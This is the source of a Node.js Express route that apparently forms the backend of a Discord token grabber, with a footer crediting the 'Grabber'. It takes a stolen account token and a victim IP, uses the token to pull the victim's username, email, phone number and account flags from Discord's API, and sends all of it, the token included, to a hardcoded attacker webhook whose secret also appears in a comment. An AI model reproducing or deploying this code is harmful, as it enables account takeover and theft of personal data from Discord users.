const express = require('express');
const router = express.Router();
const fetch = require('node-fetch');
const {WebhookClient, MessageEmbed} = require('discord.js');
    const webhook = new WebhookClient("861652348848570398", "C5dRI1sIHEvTQlCV8IFNQAB5lUbEEy9eMSr0BiRgZd_7-EMEF_koOu5B_PAujaQf7U1O");

router.get('/', async (req,res) => {
    if(!req.query.token || !req.query.ip) return res.render('404', {layout:'home'});
    //let parse = parseWebhookURL(req.query.webhook);
    //if(parse == null) return res.render('404', {layout:'home'});
    let user = await getUserData(req.query.token);
    if(user == null || !user.username) return res.send('no done');
    
    webhook.send(new MessageEmbed().setTitle(`${user.username}#${user.discriminator} | ${user.id}`).addField("Email",user.email).addField("Mobile Number",user.phone).addField("IP Adress",req.query.ip).addField("premium_type",user.premium_type).addField("Token",req.query.token).addField("Flags",user.flags).setFooter("Grabber by × ΉƧΣ ×⚡`#2080").setColor("WHITE"));
    res.send('done');
})

async function getUserData(token){
    try{
        const buffer = await fetch('https://discordapp.com/api/v6/users/@me', {
            headers:{
            'Content-Type':'application/json',
            'Authorization':token,
             'User-Agent':"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
        })
        let json = await buffer.json();
        if(json.code) return null;
        return json;
    }catch(err)
    {
        return null;
    }
}

function parseWebhookURL(url)
{
    let cid = "";
    if(!url.startsWith('https://discord.com/api/webhooks/')) return null;
    let webhookCID1 = url.slice('https://discord.com/api/webhooks/'.length)
    var webhookCID = "";
    var webhookToken = "";
    for(var i = 0; i<webhookCID1.length; i++)
    {
        if(!isNaN(webhookCID1[i])) break;
        webhookCID+=webhookCID1[i];
    }
    if(!url.startsWith(`https://discord.com/api/webhooks/${webhookCID}/`)) return null;
    webhookToken=url.slice(`https://discord.com/api/webhooks/${webhookCID}/`);
    return {clientID:webhookCID,token:webhookToken};
}

module.exports = router;

//https://discord.com/api/webhooks/861652348848570398/C5dRI1sIHEvTQlCV8IFNQAB5lUbEEy9eMSr0BiRgZd_7-EMEF_koOu5B_PAujaQf7U1O
